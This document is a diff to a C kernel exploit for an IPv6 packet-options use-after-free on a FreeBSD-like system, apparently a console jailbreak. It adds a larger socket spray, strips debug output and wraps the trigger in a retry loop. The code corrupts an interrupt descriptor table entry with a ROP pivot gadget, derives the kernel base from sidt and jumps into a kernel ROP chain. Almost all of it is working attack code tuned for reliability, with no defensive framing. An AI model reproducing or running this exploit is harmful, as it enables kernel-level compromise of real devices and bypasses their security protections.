@@ -22,6 +22,7 @@
 #define TCLASS_MASTER_2 0x73310000
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
+#define SPRAY_SIZE 64
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
@@ -112,13 +113,13 @@ void trigger_uaf(struct opaque* o) {
     pthread_create(qqq + 128, NULL, free_thread, o);
 
     while (1) {
-        for (int i = 0; i < 32; i++)
+        for (int i = 0; i < SPRAY_SIZE; i++)
             set_tclass(o->spray_sock[i], TCLASS_SPRAY);
 
         if (get_tclass(o->master_sock) == TCLASS_SPRAY)
             break;
 
-        for (int i = 0; i < 32; i++)
+        for (int i = 0; i < SPRAY_SIZE; i++)
             if (free_pktopts(o->spray_sock[i]))
                 *(volatile int*)0;
 
@@ -129,6 +130,7 @@ void trigger_uaf(struct opaque* o) {
     o->triggered = 1;
     while (!o->done1 || !o->done2);
 }
+
 
 int build_rthdr_msg(char* buf, int size) {
     int len = ((size / 8) - 1) & ~1;
@@ -161,22 +163,25 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
     int tclass;
 
     while (1) {
-        for (int i = 0; i < 32; i++) {
+        for (int i = 0; i < SPRAY_SIZE; i++) {
             *(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
             *(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
             if (set_rthdr(o->spray_sock[i], buf, l))
                 *(volatile int*)0;
         }
+
         tclass = get_tclass(o->master_sock);
         if ((tclass & 0xffff0000) == tclass0)
             break;
 
-        for (int i = 0; i < 32; i++)
+        for (int i = 0; i < SPRAY_SIZE; i++)
             if (set_rthdr(o->spray_sock[i], NULL, 0))
                 *(volatile int*)0;
     }
+
     return tclass & 0xffff;
 }
+
 
 // Invokes a string ROP to get the IDT base
 unsigned long long __builtin_gadget_addr(const char*);
@@ -205,6 +210,7 @@ void sidt(unsigned long long* addr, unsigned short* size) {
     *addr = *(unsigned long long*)(buf + 2);
 }
 
+
 // Assign the process to a specific core and set priority
 void pin_to_cpu(int cpu) {
     cpuset_t set;
@@ -214,6 +220,7 @@ void pin_to_cpu(int cpu) {
     struct sched_param sp = { .sched_priority = 99 }; // Maximum priority for non preempted thread security
     sched_setscheduler(0, SCHED_FIFO, &sp);
 }
+
 
 // External inputs from gadgets and ROP buffers
 void (*enter_krop)(void);
@@ -241,7 +248,6 @@ int main() {
     uint64_t idt_base;
     uint16_t idt_size;
     sidt(&idt_base, &idt_size);
-    printf("sidt = 0x%hx 0x%llx\n", idt_size, idt_base);
 
     krop_idt_base = idt_base;
     uint64_t kernel_base = idt_base - 0x1bbb9e0;
@@ -265,50 +271,51 @@ int main() {
         .spray_sock = spray_sock
     };
 
-    trigger_uaf(&o);
-    printf("uaf ok!\n");
-
-    set_tclass(master_sock, TCLASS_TAINT);
-
     int overlap_idx = -1;
-    for (int i = 0; i < 512; i++)
-        if (get_tclass(spray_sock[i]) == TCLASS_TAINT)
-            overlap_idx = i;
+    for (int attempts = 0; attempts < 5; attempts++) {
+        trigger_uaf(&o);
+        set_tclass(master_sock, TCLASS_TAINT);
 
-    printf("overlap_idx = %d\n", overlap_idx);
-    if (overlap_idx < 0) return 1;
+        overlap_idx = -1;
+        for (int i = 0; i < 512; i++)
+            if (get_tclass(spray_sock[i]) == TCLASS_TAINT)
+                overlap_idx = i;
 
-    int overlap_sock = spray_sock[overlap_idx];
-    spray_sock[overlap_idx] = new_socket();
+        if (overlap_idx < 0)
+            continue;
 
-    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
-    if (overlap_idx < 0) return 1;
+        int overlap_sock = spray_sock[overlap_idx];
+        spray_sock[overlap_idx] = new_socket();
 
-    overlap_sock = spray_sock[overlap_idx];
-    spray_sock[overlap_idx] = new_socket();
+        overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
+        if (overlap_idx < 0)
+            continue;
 
-    char buf[20];
-    get_pktinfo(master_sock, buf);
-    printf("idt before corruption: ");
-    for (int i = 0; i < 20; i++) printf("%02x ", (unsigned char)buf[i]);
-    printf("\n");
+        overlap_sock = spray_sock[overlap_idx];
+        spray_sock[overlap_idx] = new_socket();
 
-    char buf2[20];
-    for (int i = 0; i < 20; i++) buf2[i] = buf[i];
+        char buf[20];
+        get_pktinfo(master_sock, buf);
 
-    uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
-    krop_c3bak1 = *(uint64_t*)(buf2 + 4);
-    krop_c3bak2 = *(uint64_t*)(buf2 + 12);
+        char buf2[20];
+        for (int i = 0; i < 20; i++) buf2[i] = buf[i];
 
-    *(uint16_t*)(buf2 + 4) = (uint16_t)entry_gadget;
-    *(uint64_t*)(buf2 + 10) = entry_gadget >> 16;
-    buf2[9] = 0xee; // tipo de segmento
+        uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");
+        krop_c3bak1 = *(uint64_t*)(buf2 + 4);
+        krop_c3bak2 = *(uint64_t*)(buf2 + 12);
 
-    krop_ud1 = *(uint64_t*)(buf2 + 4);
-    krop_ud2 = *(uint64_t*)(buf2 + 12);
+        *(uint16_t*)(buf2 + 4) = (uint16_t)entry_gadget;
+        *(uint64_t*)(buf2 + 10) = entry_gadget >> 16;
+        buf2[9] = 0xee;
 
-    set_pktinfo(master_sock, buf2);
-    enter_krop();
+        krop_ud1 = *(uint64_t*)(buf2 + 4);
+        krop_ud2 = *(uint64_t*)(buf2 + 12);
+
+        set_pktinfo(master_sock, buf2);
+        enter_krop();
+
+        break; // Successful exploit
+    }
 
     // Map spray to ROP execution
     char* spray_start = spray_bin;
@@ -317,7 +324,7 @@ int main() {
     for (size_t i = 0; i < spray_stop - spray_start; i++)
         spray_map[i] = spray_start[i];
 
-    // Malloc sprays for CPU cores
+    // Run malloc sprays for pinned cores
     for (int cpu = 1; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
         rop_call_funcptr(spray_map, spray_sock, kernel_base);
@@ -329,3 +336,4 @@ int main() {
 
     return 0;
 }
+
